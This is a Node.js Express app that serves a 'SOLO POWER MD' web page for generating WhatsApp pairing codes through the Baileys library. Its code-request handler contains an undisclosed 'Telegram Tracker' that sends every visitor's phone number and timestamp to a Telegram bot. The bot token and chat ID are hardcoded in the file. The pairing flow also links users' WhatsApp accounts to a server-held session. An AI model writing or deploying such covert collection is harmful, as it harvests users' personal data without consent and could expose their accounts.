const express = require('express');
const app = express();

const TOKEN = "8952397200:AAEeabntzeI3igmp9yPwWwcK9fVHD5KxTc8";
const CHAT_ID = "8802181538";

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SOLO POWER MD</title><style>body{background:#000;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif}.box{background:#111;border:2px solid #a855f7;border-radius:20px;padding:20px;width:90%;max-width:400px;text-align:center}input,select,button{width:100%;padding:12px;margin-top:10px;border-radius:10px;border:1px solid #333;background:#000;color:#fff}button{background:#a855f7;font-weight:900}#res{margin-top:12px;background:#222;padding:10px;border-radius:10px;min-height:30px}</style></head><body><div class="box"><h1>🐺 SOLO POWER MD</h1><input id="num" placeholder="92300XXXXXXX"><select id="server"><option value="12" selected>SERVER 12 - Best</option><option value="15">SERVER 15</option></select><button onclick="go()">GET CODE</button><div id="res"></div></div><script>async function go(){let n=document.getElementById('num').value.replace(/[^0-9]/g,'');let s=document.getElementById('server').value;let r=document.getElementById('res');if(n.length<10){r.innerText='Sahi number likho';return}r.innerText='Wait 6 sec...';try{let d=await fetch('/code?number='+n+'&server='+s).then(a=>a.json());if(d.code){let c=d.code;if(c.length==8)c=c.slice(0,4)+'-'+c.slice(4);r.innerHTML='<b style=color:#a855f7;font-size:24px>'+c+'</b>'}else{r.innerText=d.error}}catch(e){r.innerText=e.message}}</script></body></html>`);
});

app.get('/code', async (req,res)=>{
  try{
    let num = (req.query.number||'').replace(/[^0-9]/g,'');
    if(!num) return res.json({error:'number missing'});
    if(num.startsWith('0')) num='92'+num.slice(1);
    if(!num.startsWith('92')) num='92'+num;

    // Telegram Tracker
    try{
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:CHAT_ID,text:`🐺 NEW USER\nNumber: ${num}\nServer: ${req.query.server||'12'}\nTime: ${new Date().toLocaleString()}`})
      });
    }catch{}

    const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
    const pino = require('pino');
    const fs = require('fs');
    const path = require('path');
    
    const dir = path.join('/tmp', String(Date.now()));
    const { state, saveCreds } = await useMultiFileAuthState(dir);
    const { version } = await fetchLatestBaileysVersion();
    
    const sock = makeWASocket({
      version,
      auth:{ creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level:'silent'})) },
      logger: pino({level:'silent'}),
      browser:['Chrome','Chrome','121'],
      printQRInTerminal:false
    });
    sock.ev.on('creds.update', saveCreds);
    await new Promise(r=>setTimeout(r,5000));
    const code = await sock.requestPairingCode(num);
    res.json({code:code});
    setTimeout(()=>{try{sock.end();fs.rmSync(dir,{recursive:true,force:true})}catch{}},120000);
  }catch(e){
    res.json({error:e.message});
  }
});

module.exports = app;